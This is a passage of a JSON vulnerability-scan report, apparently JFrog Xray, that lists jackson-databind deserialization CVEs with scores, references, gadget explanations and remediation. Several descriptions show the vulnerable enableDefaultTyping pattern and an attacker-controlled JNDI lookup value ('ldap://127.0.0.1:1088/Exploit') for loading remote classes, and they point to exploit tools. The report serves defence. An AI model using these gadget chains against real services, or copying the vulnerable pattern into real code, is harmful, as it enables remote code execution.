`org.apache.commons.proxy.provider.remoting.RmiProvider` and bind the payload with it using the `bind` method which `RmiProvider` will invoke later and result in remote code execution. A sample malicious `RmiProvider` is provided in the [marshalsec](https://github.com/mbechler/marshalsec) exploitation tool (`RmiRefServer`).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-proxy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-proxy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `commons-proxy` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36181",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138342",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36181",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/advisories/GHSA-cvm9-fjm9-3572",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/3ded28aece694d0df39c9f0fa1ff385b14a8656b",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://github.com/FasterXML/jackson-databind/issues/3004",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in dbcp in Apache Tomcat in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp gadget, \nthe attacker might control the DB connection URL but cannot initiate the connection on demand. The real-world impact from these primitives, in the general case, is unknown.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "In the general case, the gadget cannot cause remote code execution by itself",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-9546",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig (aka shaded hikari-config).",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95082",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6%40%3Cissues.zookeeper.apache.org%3E",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6@%3Cissues.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200904-0006/",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://github.com/FasterXML/jackson-databind/issues/2631",
          "https://lists.apache.org/thread.html/r893a0104e50c1c2559eb9a5812add28ae8c3e5f43712947a9847ec18%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1@%3Cdev.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200904-0006",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-9546",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/03/msg00008.html",
          "https://lists.apache.org/thread.html/r893a0104e50c1c2559eb9a5812add28ae8c3e5f43712947a9847ec18@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596%40%3Cissues.zookeeper.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Hadoop in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig` gadget in [Apache Hadoop](http://hadoop.apache.org/) , the attacker can call `lookup` with an arbitrary location by calling `setHealthCheckRegistry ` with an arbitrary argument such as `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` apache.hadoop ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` apache.hadoop ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `apache.hadoop` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-10673",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502",
              "NVD-CWE-Other"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.caucho.config.types.ResourceRef (aka caucho-quercus).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95487",
        "references": [
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/2660",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-10673",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://github.com/advisories/GHSA-fqwf-pjwf-7vqv",
          "https://lists.debian.org/debian-lts-announce/2020/03/msg00027.html",
          "https://github.com/FasterXML/jackson-databind/commit/1645efbd392989cf015f459a91c999e59c921b15",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpuoct2021.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in caucho-quercus in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [caucho]( https://github.com/dlitz/resin/tree/master/modules/kernel/src/com/caucho) gadget, an attacker can set `_lookupName` with `setLookupName` and then invoke `lookup` with an attacker-controlled value by calling `getValue`.\nWith this, the attacker is able to load class and methods from an arbitrary location such as`\"ldap://127.0.0.1:1088/Exploit\"` and perform remote code execution, as detailed in this [PoC]( https://github.com/Al1ex/CVE-2020-10673).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes caucho in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes caucho in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `caucho` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36184",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138357",
        "references": [
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/567194c53ae91f0a14dc27239afb739b1c10448a",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://github.com/advisories/GHSA-m6x4-97wx-4q27",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36184",
          "https://github.com/FasterXML/jackson-databind/issues/2998"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Tomcat dbcp2 in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp2 gadget, an attacker can create an arbitrary Pool connection to DB by invoking `testCPDS` in ` org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource`. The impact of creating such a Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp2` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-14720",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502",
              "CWE-611"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              },
              "CWE-611": {
                "name": "Improper Restriction of XML External Entity Reference",
                "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.7 might allow attackers to conduct external XML entity (XXE) attacks by leveraging failure to block unspecified JDK classes from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.2]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74874",
        "references": [
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/ba973114605d936be276ee6ce09dfbdbf78aa56f6cdc6e79bfa7b8df@%3Cdev.lucene.apache.org%3E",
